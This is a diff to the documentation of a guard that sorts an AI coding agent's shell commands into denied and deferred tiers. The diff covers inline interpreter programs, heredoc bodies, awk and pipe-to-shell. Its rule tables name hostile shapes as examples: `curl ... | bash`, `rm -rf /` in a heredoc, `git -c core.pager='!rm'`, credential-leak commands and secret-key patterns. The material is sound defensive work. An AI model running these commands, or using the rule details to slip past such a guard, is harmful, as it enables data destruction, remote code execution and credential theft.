@@ -42,9 +42,28 @@ options are peeled first (`env -i`, `env -u NAME`, `bash -o pipefail -c`,
 `ssh host --`), so a wrapper never hides the command it runs. A `-c` string
 guard cannot read (empty, an `xargs -I{}` placeholder, or a command named by
 an expansion such as `bash -c "$X"`) is denied; `$` in an argument
-(`bash -c 'echo $HOME'`) is fine. awk is checked in every mode: a literal command in
-`system()`, `print | "cmd"` or `"cmd" | getline` goes through the floor, and
-one built at run time is denied.
+(`bash -c 'echo $HOME'`) is fine. awk is checked in every mode: a command in
+`system()`, `print | cmd` or `cmd | getline` that opens with a literal
+(`"wc -l " $1`, or a variable the program assigns one) goes through the floor
+with its run-time parts stood in for by `/` and by an expansion, and one whose
+command word is only known at run time (`system($0)`) is denied.
+
+An inline program written out literally (`python3 -c '...'`, `python3 -
+<<'EOF'`, `node -e` / `--eval` / `-p`, `node --input-type=module < x.mjs`,
+`osascript -e`, `ruby -e`, `perl -e`) is STEER in auto mode under
+`bash.dangerous_interpreter:literal`. A script file (`python3 x.py`) already
+passes, and literal code is no less visible to the auto classifier than a file.
+The program stays FLOOR when it comes from a pipe (`curl ... | python3`), a
+variable or a substitution (`python3 -c "$CODE"`), a here-string, or an
+unquoted heredoc whose body expands.
+
+Heredoc bodies are data in every mode: a body written to a file or fed to a
+filter (`cat > notes.md <<'EOF'`) is taken out before the command is split into
+lines, so a prose or config line (`at noon`, `[tool.ruff]`, a backtick fence)
+is not read as a command. A body stays commands when the command can run it
+as shell (`bash <<EOF`, `ssh host <<EOF`, `script` or `expect` on the
+heredoc, a `cat > x.sh <<EOF` followed by `bash x.sh`). In an unquoted body,
+`$(...)` and backticks still run and are checked.
 
 Every other permission mode, and lockdown in any permission mode, denies on
 both tiers exactly as before. Allowlist overrides behave the same in every
@@ -53,7 +72,10 @@ mode: an allowlisted STEER command is allowed, not deferred.
 A key is a rule id, a hook id, or `<rule>:<shape>` when one shape of a rule
 sits on a different tier from the rest. The allowlist id is always the part
 before the colon. A key missing from the table is FLOOR. Pipe-to-shell
-(`curl ... | sh`) carries no rule id and is always FLOOR.
+(`curl ... | sh`) carries no rule id and is always FLOOR: a shell or
+interpreter that reads its program from the pipe. A pipe into a script or
+module (`printf '{}' | python3 tool.py`, `cat x.json | python3 -m json.tool`)
+reads stdin as data and is not pipe-to-shell.
 
 ### FLOOR
 
@@ -96,7 +118,7 @@ before the colon. A key missing from the table is FLOOR. Pipe-to-shell
 | `bash.env_split_string` | `env -S` rebuilds argv guard cannot see |
 | `bash.wrapper_stacking` | nesting past the unwrap limit hides the inner command |
 | `bash.dangerous_rm` | recursive rm of `/`, `~`, `$HOME` or cwd |
-| `bash.function_definition:fork_bomb` | a function that pipes into or backgrounds itself exhausts the process table |
+| `bash.function_definition:fork_bomb` | a function whose body pipes into or backgrounds a call back to itself exhausts the process table |
 | `bash.conditional_denied_flag:root` | `find -delete` / `-exec` rooted at `/`, a home dir or a system directory, or an unfiltered delete of `.` or `..` |
 | `bash.disk_destruction` | disk / partition / filesystem destruction |
 | `bash.db_cli_destructive` | irreversible database destruction |
@@ -135,6 +157,7 @@ before the colon. A key missing from the table is FLOOR. Pipe-to-shell
 | `bash.admin_unknown_flag_strict` | lockdown-only unknown-flag escalation |
 | `bash.conditional_denied_flag` | `find -exec` / `-delete`, `yq -i` on a project path |
 | `bash.dangerous_construct` | command / process substitution, here-string, file redirect; bodies are still floor-checked |
+| `bash.dangerous_interpreter:literal` | inline program written out literally (`python3 -c '...'`, `python3 - <<'EOF'`, `node -e`, `osascript` / `ruby` / `perl -e`): as visible as a script file, which already passes. A program from a pipe, a variable or a substitution stays FLOOR |
 | `bash.eval_builtin:source` | `source` / `.` of a file, e.g. loading a `.env` |
 | `bash.exec_wrapper` | the peeled inner command is matched by its own rule |
 | `bash.function_definition` | shell function; the body is still floor-checked |
@@ -225,7 +248,9 @@ forward-scans past wrapper flags to the wrapped interpreter, so
 `uvx python -c`, `uvx --from pkg python -c`, `pipx run python -c`,
 `uv run python -c`, `uv run python - <<EOF`, and `uv tool run python -c` all
 deny. The deny reason steers the agent to write the code to a script file and
-run that file.
+run that file. In Claude Code's `auto` permission mode a literal program is
+STEER (`bash.dangerous_interpreter:literal`, see above), and the `python -c` /
+`python3 -c` / `node -e` / `node --eval` literals follow it.
 
 Running a script path (`uv run python tools/dev.py`, `python3 scripts/x.py
 --flag`, `node build.js`) or a module (`python -m pytest`, `python -m pip
@@ -267,10 +292,10 @@ These deny on shape, not on a literal registry prefix. A reviewer auditing
 | Dangerous env-var sinks | `_has_dangerous_env_sink` | `GIT_SSH_COMMAND=... git fetch`, `LD_PRELOAD=... cmd`, `DYLD_INSERT_LIBRARIES=... cmd`, `PYTHONPATH=... python` (see `DANGEROUS_ENV_SINKS` in registry.py) |
 | `git -c` config injection | `_is_git_config_injection` | `git -c alias.x='!cmd'`, `git -c core.pager='!rm'`, `git -c core.hooksPath=...`, `git -c core.attributesFile=...` (see `GIT_CONFIG_EXEC_SINKS` / `GIT_CONFIG_EXEC_SINK_GLOBS` in registry.py) |
 | Wrapper-stacking depth > 3 | `_exceeds_unwrap_cap` | `sudo env -i bash -c 'cmd'` (depth 4) |
-| Pipe-to-shell | `_is_pipe_to_shell` | `curl http://x \| bash`, `wget -O- ... \| sh` |
+| Pipe-to-shell | `_is_pipe_to_shell` | `curl http://x \| bash`, `wget -O- ... \| sh`, `cat s \| python3 -`; a consumer that runs a script (`\| python3 tool.py`) is not one |
 | Credential leak | `CREDENTIAL_LEAK_PATTERNS` | `gh auth token`, `aws iam create-access-key`, `aws sts get-session-token`, `op read` |
 | Secret value in command text | `get_secret_value_deny` (`bash.secret_value`) | Known key prefixes (`sk-ant-…`, `AKIA…`, `ghp_…`, `glpat-…`, `xox…`, `AIza…`, JWTs, PEM blocks) or a high-entropy assigned value (`TOKEN=<random>`) -- denies in both modes so a literal secret never reaches the shell |
-| Heredoc body feeding a shell/eval sink | `_shell_code_mask` (heredoc handling) | `bash <<EOF\nrm -rf /\nEOF`, `cat <<EOF \| sh` -- write/doc-sink heredoc bodies are masked, but eval/shell-sink bodies stay visible and are re-evaluated |
+| Heredoc body feeding a shell/eval sink | `_heredoc_skeleton`, `_shell_code_mask` | `bash <<EOF\nrm -rf /\nEOF`, `cat <<EOF \| sh` -- data heredoc bodies are taken out before the line split, but a body the command can run as shell stays visible and is re-evaluated |
 | Force-push refspec | `_is_git_force_refspec` | `git push origin +HEAD:main`, `git push origin +refs/heads/main:refs/heads/main` |
 | `git submodule add` | `_is_git_submodule_add` | `git submodule add https://evil/pkg` (fetches arbitrary repo) |
 | `git worktree add <system-path>` | `_is_git_worktree_add` | `git worktree add /etc/passwd HEAD`, `git worktree add -b branch /usr/local/wt HEAD` |
